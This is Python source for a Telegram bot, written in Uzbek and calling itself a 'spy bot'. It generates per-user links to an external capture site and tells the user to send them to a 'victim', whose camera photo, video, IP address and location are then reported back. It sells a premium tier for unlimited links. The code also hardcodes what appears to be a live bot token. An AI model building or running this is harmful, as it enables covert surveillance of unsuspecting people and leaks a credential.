import os
import sqlite3
import logging
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton

# --- SOZLAMALAR ---
TOKEN = "8509571152:AAFw5GXdZRyuiqTOzm3znlQCa_S4JQXcnvU"
ADMIN_ID = 5775388579
# Sayt manzili (Bunda rasm/video oladigan script bo'lishi kerak, hozircha namuna sifatida)
SITE_URL = "https://camera-capture-pro.vercel.app" 

bot = Bot(token=TOKEN)
dp = Dispatcher()
logging.basicConfig(level=logging.INFO)

# --- DATABASE ---
def init_db():
    conn = sqlite3.connect("capture_bot.db", check_same_thread=False)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, is_premium INTEGER DEFAULT 0, used_count INTEGER DEFAULT 0)")
    cur.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
    conn.commit()
    return conn

db = init_db()

# --- STATES ---
class AdminState(StatesGroup):
    wait_id = State()
    wait_card = State()

# --- KEYBOARDS ---
def main_kb(user_id):
    kb = [
        [KeyboardButton(text="📸 Rasm olish"), KeyboardButton(text="📹 Video olish")],
        [KeyboardButton(text="🌐 IP manzil olish"), KeyboardButton(text="📍 Lokatsiya olish")],
        [KeyboardButton(text="💎 Premium olish"), KeyboardButton(text="📊 Statistika")]
    ]
    if user_id == ADMIN_ID:
        kb.append([KeyboardButton(text="⚙️ Admin Panel")])
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

# --- HANDLERS ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    cursor = db.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    db.commit()
    await message.answer(f"Salom! Bu ilg'or Shpion bot.\nKerakli bo'limni tanlang:", reply_markup=main_kb(user_id))

@dp.message(F.text.in_(["📸 Rasm olish", "📹 Video olish", "🌐 IP manzil olish", "📍 Lokatsiya olish"]))
async def capture_request(message: types.Message):
    user_id = message.from_user.id
    cursor = db.cursor()
    cursor.execute("SELECT is_premium, used_count FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    
    if user[0] == 0 and user[1] >= 5:
        await message.answer("❌ Bepul limit (5 marta) tugagan. Davom etish uchun Premium oling.")
        return

    # Link yaratish (Namuna: har bir user uchun alohida link)
    method = message.text.split()[0]
    target_link = f"{SITE_URL}?id={user_id}&type={method}"
    
    cursor.execute("UPDATE users SET used_count = used_count + 1 WHERE user_id=?", (user_id,))
    db.commit()

    await message.answer(
        f"✅ {message.text} uchun havola tayyor!\n\n"
        f"Ushbu havolani qurbonga yuboring. U havolaga kirishi bilan ma'lumotlar sizga yuboriladi:\n"
        f"🔗 `{target_link}`",
        parse_mode="Markdown"
    )

@dp.message(F.text == "💎 Premium olish")
async def get_premium(message: types.Message):
    cursor = db.cursor()
    cursor.execute("SELECT value FROM settings WHERE key='card'")
    card = cursor.fetchone()
    card_num = card[0] if card else "Admin hali karta kiritmagan"
    
    await message.answer(
        f"💎 **Premium afzalliklari:**\n- Cheksiz link yaratish\n- Maxfiy rejim\n- Tezkor ma'lumot\n\n"
        f"💰 Narxi: 5,000 so'm\n💳 Karta: `{card_num}`\n\n"
        f"To'lov qilgach, @Sardorbeko008 ga chekni yuboring.",
        parse_mode="Markdown"
    )

# --- ADMIN PANEL ---
@dp.message(F.text == "⚙️ Admin Panel", F.from_user.id == ADMIN_ID)
async def admin_panel(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Premium berish (ID orqali)", callback_data="adm_prem")],
        [InlineKeyboardButton(text="💳 Karta sozlash", callback_data="adm_card")]
    ])
    await message.answer("Admin boshqaruv paneli:", reply_markup=kb)

@dp.callback_query(F.data == "adm_card")
async def adm_card(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminState.wait_card)
    await callback.message.answer("Yangi karta raqamini yuboring:")
    await callback.answer()

@dp.message(AdminState.wait_card)
async def save_card(message: types.Message, state: FSMContext):
    cursor = db.cursor()
    cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES ('card', ?)", (message.text,))
    db.commit()
    await message.answer(f"✅ Karta saqlandi: {message.text}")
    await state.clear()

@dp.callback_query(F.data == "adm_prem")
async def adm_prem(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminState.wait_id)
    await callback.message.answer("Premium beriladigan User ID sini yuboring:")
    await callback.answer()

@dp.message(AdminState.wait_id)
async def give_prem(message: types.Message, state: FSMContext):
    if message.text.isdigit():
        cursor = db.cursor()
        cursor.execute("UPDATE users SET is_premium=1 WHERE user_id=?", (int(message.text),))
        db.commit()
        await message.answer(f"✅ ID: {message.text} foydalanuvchiga Premium berildi.")
        try:
            await bot.send_message(int(message.text), "🎉 Tabriklaymiz! Sizga Premium statusi berildi.")
        except: pass
        await state.clear()
    else:
        await message.answer("ID faqat raqamlardan iborat bo'ladi.")

# --- STARTUP ---
async def main():
    print("Shpion Capture Bot ishga tushdi...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
